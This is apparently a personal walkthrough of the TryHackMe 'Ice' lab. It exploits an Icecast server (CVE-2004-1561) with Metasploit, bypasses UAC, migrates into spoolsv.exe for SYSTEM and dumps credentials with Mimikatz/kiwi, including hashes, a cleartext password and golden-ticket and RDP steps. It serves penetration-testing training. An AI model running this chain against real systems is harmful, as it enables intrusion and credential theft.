# TRYHACKME - Ice

```bash
export IP=10.10.146.114
```

## Recon
```bash
sudo nmap -sS -Pn -sV -sC -oN nmap/init.txt -v $IP
```

```
8000/tcp  open  http           Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET
```
=> **CVE-2004-1561**: Execute Code Overflow : https://www.cvedetails.com/cve/CVE-2004-1561/

## Exploit

```bash
msfconsole

search CVE-2004-1561
use 
set # lhost, rhost, rport,...
exploit
```

Foothold

## Post Exploitation
```bash
# whoami in meterpreter shell
getuid # user: DARK-PC\Dark
sysinfo # OS              : Windows 7 (6.1 Build 7601, Service Pack 1); x64

background # session id: 1
use post/multi/recon/local_exploit_suggester # Now that we know the architecture of the process, to perform some further recon. While this(meterpreter x86) doesn't work the best on x64 machines. Using this post module to hang as it tests exploits and might take several minutes to complete
set session 1
exploit

# [+] 10.10.38.248 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
use exploit/windows/local/bypassuac_eventvwr
set session 1
set lhost tun0
set lport 4445
exploit
# [+] Part of Administrators group! Continuing...

getprivs # We can now verify that we have expanded permissions using this command
```

Priviledge Escalation to NT AUTHORITY\SYSTEM: lsass serviceresponsible for authentication within Windows.


In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?: *spoolsv.exe*

```bash
migrate -N spoolsv.exe # Migrate to this process
getuid # Server username: NT AUTHORITY\SYSTEM
```
Now that we've made our way to full administrator permissions we'll set our sights on *looting*. **Mimikatz** is a rather infamous *password dumping tool* that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)
```bash
load kiwi
# successful
help # Kiwi Commands
creds_all # Retrieve all credentials
```

Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)

```
Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC     

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

Command allows us to watch the remote user's desktop in real time: `screenshare`

!!
picture here
!!


Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain
```bash
golden_ticket_create
```


As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP).  If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`

note: evil-winrm: 5985 WinRM

```bash
xfreerdp /f /u:Dark /p:Password01! /v:$IP[:PORT]
 ```

 ## Futher Reading
Mannual Exploit IceCast: https://www.exploit-db.com/exploits/568
